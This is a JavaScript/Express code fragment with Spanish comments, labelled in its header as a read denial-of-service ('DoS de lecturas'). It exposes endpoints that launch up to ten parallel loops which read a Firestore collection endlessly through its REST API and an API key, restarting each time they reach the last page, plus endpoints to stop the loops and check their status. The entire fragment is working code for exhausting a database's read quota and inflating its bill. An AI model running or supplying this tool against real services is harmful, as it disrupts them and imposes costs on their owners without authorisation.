// ========== LECTURA PERPETUA (DoS de lecturas) ==========
let runningLoops = new Map(); // Para llevar control de loops activos

async function perpetualReadCycle(coleccion, delayMs, loopId, resultados) {
  let pageToken = null;
  let totalDocs = 0;
  let startTime = Date.now();
  
  try {
    while (runningLoops.has(loopId)) {
      const url = `${FIRESTORE_URL}/${coleccion}?key=${API_KEY}&pageSize=100` +
                  (pageToken ? `&pageToken=${pageToken}` : '');
      
      try {
        const response = await axios.get(url);
        const data = response.data;
        const docs = data.documents || [];
        totalDocs += docs.length;
        resultados.totalDocs += docs.length;
        resultados.pagesRead++;
        
        pageToken = data.nextPageToken || null;
        
        // Si no hay más páginas, reiniciamos el ciclo para no parar
        if (!pageToken) {
          pageToken = null; // volver a empezar
        }
        
        // Retardo configurable
        if (delayMs > 0) {
          await new Promise(resolve => setTimeout(resolve, delayMs));
        }
      } catch (err) {
        console.error(`Error en loop ${loopId}:`, err.message);
        // Pausa ante error para no machacar
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  } catch (e) {
    console.error(`Loop ${loopId} detenido por excepción:`, e.message);
  }
  runningLoops.delete(loopId);
}

app.get('/stress-read-forever/:coleccion', async (req, res) => {
  const coleccion = req.params.coleccion;
  const paralelo = parseInt(req.query.parallel) || 1;   // número de loops concurrentes
  const delay = parseInt(req.query.delay) || 200;       // ms entre peticiones (por loop)
  const tiempoMax = parseInt(req.query.maxTime) || 0;   // segundos máximo, 0 = infinito

  if (paralelo < 1 || paralelo > 10) return res.status(400).json({ error: 'Paralelo entre 1 y 10' });
  if (delay < 0 || delay > 5000) return res.status(400).json({ error: 'Delay entre 0 y 5000 ms' });

  // Iniciar loops
  const resultados = { totalDocs: 0, pagesRead: 0, loops: paralelo, delay };
  const startTime = Date.now();

  for (let i = 0; i < paralelo; i++) {
    const loopId = `${Date.now()}-${i}`;
    runningLoops.set(loopId, true);
    perpetualReadCycle(coleccion, delay, loopId, resultados);
  }

  // Si se especifica tiempo máximo, detener después de ese tiempo
  if (tiempoMax > 0) {
    setTimeout(() => {
      // Detenemos todos los loops activos
      for (const loopId of runningLoops.keys()) {
        runningLoops.set(loopId, false);
      }
      runningLoops.clear();
    }, tiempoMax * 1000);
  }

  // Respuesta inmediata con instrucciones para detener
  res.json({
    message: `🔥 Lectura perpetua iniciada en colección '${coleccion}' con ${paralelo} hilos, delay ${delay}ms.`,
    stopEndpoint: '/stress-stop-read-forever',
    statusEndpoint: '/stress-read-forever-status'
  });
});

// Endpoint para detener todos los loops
app.get('/stress-stop-read-forever', (req, res) => {
  for (const loopId of runningLoops.keys()) {
    runningLoops.set(loopId, false);
  }
  runningLoops.clear();
  res.json({ message: 'Todos los loops de lectura detenidos.' });
});

// Endpoint para ver estado actual (simple)
app.get('/stress-read-forever-status', (req, res) => {
  res.json({
    activeLoops: runningLoops.size,
    // No tenemos resultados globales persistentes, pero podemos devolver básico
  });
});
